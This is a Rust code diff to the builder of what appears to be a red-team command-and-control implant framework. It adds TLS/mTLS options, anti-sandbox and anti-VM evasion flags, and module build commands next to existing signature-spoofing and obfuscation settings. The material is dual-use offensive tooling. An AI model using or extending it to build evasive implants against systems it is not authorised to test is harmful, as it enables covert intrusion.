@@ -16,6 +16,7 @@ use serde_yaml::Value as YamlValue;
 
 use crate::build::payload::build_payload;
 use crate::cmd::{BuildCommands, Cli, Commands, GenerateCommands, PayloadType, Tool};
+use crate::generate::{detect_source_mode, update_workspace_members};
 use std::collections::HashMap;
 use std::{fs, process};
 use strum_macros::{Display, EnumString};
@@ -30,7 +31,6 @@ mod tool;
 struct Implant {
     basic: BasicConfig,
     implants: ImplantConfig,
-    metadata: Option<MetaData>,
     pulse: Option<PulseConfig>,
     build: Option<BuildConfig>,
 }
@@ -40,11 +40,10 @@ struct BasicConfig {
     name: String,
     targets: Vec<String>,
     protocol: String,
-    tls: bool,
+    tls: TLSConfig,
     proxy: String,
     interval: u64,
     jitter: f64,
-    ca: String,
     encryption: String,
     key: String,
     rem: REMConfig,
@@ -52,9 +51,47 @@ struct BasicConfig {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+struct TLSConfig {
+    enable: bool,
+    /// TLS版本: "auto", "1.2", "1.3"
+    #[serde(default = "default_tls_version")]
+    version: String,
+    /// 服务器名称指示（SNI）
+    #[serde(default)]
+    sni: String,
+    #[serde(default)]
+    skip_verification: bool,
+    /// mTLS客户端证书配置
+    #[serde(default)]
+    mtls: Option<MTLSConfig>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+struct MTLSConfig {
+    /// 启用mTLS
+    enable: bool,
+    /// 客户端证书文件路径
+    client_cert: String,
+    /// 客户端私钥文件路径
+    client_key: String,
+    /// 用于验证服务端的CA证书路径（可选）
+    #[serde(default)]
+    server_ca: String,
+}
+
+// 默认值函数
+fn default_tls_version() -> String {
+    "auto".to_string()
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
 struct BuildConfig {
     zigbuild: bool,
     ollvm: Ollvm,
+    metadata: Option<MetaData>,
+    
+    #[serde(rename = "remap")]
+    refresh_remap_path_prefix: bool,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -136,6 +173,8 @@ struct ImplantConfig {
     #[serde(default)]
     pack: Option<Vec<PackResource>>,
     autorun: String,
+    #[serde(default)]
+    anti: Option<AntiConfig>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -211,6 +250,14 @@ struct PESignatureModify {
 struct PESModify {
     magic: String,
     signature: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+struct AntiConfig {
+    #[serde(default)]
+    sandbox: bool,
+    #[serde(default)]
+    vm: bool,
 }
 
 #[derive(Debug, Clone, Copy, EnumString, Display, ValueEnum)]
@@ -336,9 +383,9 @@ fn parse_generate(
             log_info!("Generating prelude configuration");
             update_prelude_config(yaml_path, resources, key, spite)
         }
-        GenerateCommands::Modules { modules } => {
-            if !modules.is_empty() {
-                yaml_config.implants.modules = modules.split(",").map(|x| x.to_string()).collect();
+        GenerateCommands::Modules { module } => {
+            if !module.is_empty() {
+                yaml_config.implants.modules = module.split(",").map(|x| x.to_string()).collect();
                 log_info!("Using modules: {:?}", yaml_config.implants.modules);
             }
             update_beacon_config(yaml_config)
@@ -367,10 +414,43 @@ fn parse_build(config: &mut Implant, build: &BuildCommands, target: &String) -> 
         .ok_or_else(|| anyhow::anyhow!("build configuration is required but not found"))?;
 
     let result = match build {
-        BuildCommands::Malefic => build_payload(build_config, &PayloadType::MALEFIC, target),
-        BuildCommands::Modules => build_payload(build_config, &PayloadType::MODULES, target),
-        BuildCommands::Pulse => build_payload(build_config, &PayloadType::PULSE, target),
-        BuildCommands::Prelude => build_payload(build_config, &PayloadType::PRELUDE, target),
+        BuildCommands::Malefic => build_payload(build_config, &PayloadType::MALEFIC, target, None),
+        BuildCommands::Modules { module } => {
+            use crate::generate::update_module_toml;
+            // 1. 判断命令行参数是否为空，决定用 config 还是命令行
+            let mut modules: Vec<String> = Vec::new();
+            if !module.is_empty() {
+                modules.extend(module.split(',').map(|s| s.trim().to_string()));
+                config.implants.modules = modules.clone();
+            } else {
+                modules = config.implants.modules.clone();
+            }
+            // 2. 更新 features 到 toml
+            update_module_toml(&modules);
+            // 3. 编译 malefic-modules
+            build_payload(build_config, &PayloadType::MODULES, target, Some(&modules))
+        }
+        BuildCommands::Modules3rd { module } => {
+            use crate::generate::update_3rd_toml;
+            // 1. 判断命令行参数是否为空，决定用 config 还是命令行
+            let mut third_modules: Vec<String> = Vec::new();
+            if !module.is_empty() {
+                third_modules.extend(module.split(',').map(|s| s.trim().to_string()));
+                config.implants.third_modules = third_modules.clone();
+            } else {
+                third_modules = config.implants.third_modules.clone();
+            }
+            third_modules.push("as_cdylib".to_string());
+            update_3rd_toml(&third_modules);
+            build_payload(
+                build_config,
+                &PayloadType::THIRD,
+                target,
+                Some(&third_modules),
+            )
+        }
+        BuildCommands::Pulse => build_payload(build_config, &PayloadType::PULSE, target, None),
+        BuildCommands::Prelude => build_payload(build_config, &PayloadType::PRELUDE, target, None),
     };
     result
 }
@@ -440,13 +520,14 @@ fn main() -> anyhow::Result<()> {
     match &cli.command {
         Commands::Generate {
             version,
-            source,
             config,
             command,
         } => {
             let mut implant_config = load_yaml_config(config)?;
             validate_yaml_config(config)?;
-            parse_generate(&mut implant_config, command, *version, *source)
+            let source = detect_source_mode();
+            update_workspace_members(source)?;
+            parse_generate(&mut implant_config, command, *version, source)
         }
         Commands::Build {
             config,
